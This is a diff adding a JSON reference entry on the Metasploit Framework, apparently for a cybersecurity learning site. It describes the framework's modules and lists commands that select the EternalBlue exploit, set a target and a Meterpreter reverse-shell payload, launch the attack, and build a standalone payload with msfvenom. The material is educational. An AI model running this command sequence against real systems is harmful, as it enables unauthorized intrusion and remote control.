@@ -1,0 +1,40 @@
+{
+  "id": "metasploit",
+  "title": "Metasploit Framework",
+  "shortName": "Metasploit",
+  "type": "tool",
+  "category": "exploitation_framework",
+  "description": "The world's most widely used penetration testing framework — exploit development, delivery, and post-exploitation.",
+  "fullExplanation": "Metasploit is an open-source penetration testing framework that provides a complete environment for developing, testing, and executing exploits. It contains 2,000+ exploits, 1,000+ payloads, and hundreds of auxiliary modules. The msfconsole is the primary interface. Metasploit Pro adds automation and reporting for enterprise use. Originally created by HD Moore in 2003, acquired by Rapid7 in 2009.",
+  "components": [
+    { "name": "msfconsole", "description": "Primary command-line interface — search, configure, and launch exploits" },
+    { "name": "Exploits", "description": "2,000+ modules targeting specific CVEs in software and services" },
+    { "name": "Payloads", "description": "Code executed after exploitation — Meterpreter, shell, staged/stageless" },
+    { "name": "Meterpreter", "description": "Advanced in-memory payload — file system, network, pivoting, keylogging" },
+    { "name": "Auxiliary", "description": "Scanners, fuzzers, sniffers, brute-forcers — no exploitation" },
+    { "name": "Post", "description": "Post-exploitation modules — privilege escalation, persistence, pivoting" },
+    { "name": "Encoders", "description": "Obfuscate payloads to evade AV detection" }
+  ],
+  "commonCommands": [
+    { "command": "search eternalblue", "description": "Search for EternalBlue exploit modules" },
+    { "command": "use exploit/windows/smb/ms17_010_eternalblue", "description": "Select exploit module" },
+    { "command": "set RHOSTS 192.168.1.10", "description": "Set target host" },
+    { "command": "set PAYLOAD windows/x64/meterpreter/reverse_tcp", "description": "Set Meterpreter payload" },
+    { "command": "run / exploit", "description": "Launch the exploit" },
+    { "command": "sessions -l", "description": "List active Meterpreter sessions" },
+    { "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe", "description": "Generate standalone payload" }
+  ],
+  "keyFacts": [
+    "2,000+ exploits, 1,000+ payloads, 500+ auxiliary modules",
+    "Meterpreter runs entirely in memory — no files written to disk",
+    "msfvenom generates standalone payloads in 40+ formats",
+    "Metasploit Pro adds automated exploitation and reporting",
+    "Always get written authorization before using Metasploit",
+    "EternalBlue module: ms17_010_eternalblue — most used exploit",
+    "Armitage: GUI frontend for Metasploit"
+  ],
+  "children": [],
+  "parent": "tools",
+  "relatedConcepts": ["nmap", "buffer-overflow", "ids-ips"],
+  "visualization": { "color": "#ffcc00", "icon": "💀", "nodeType": "leaf" }
+}
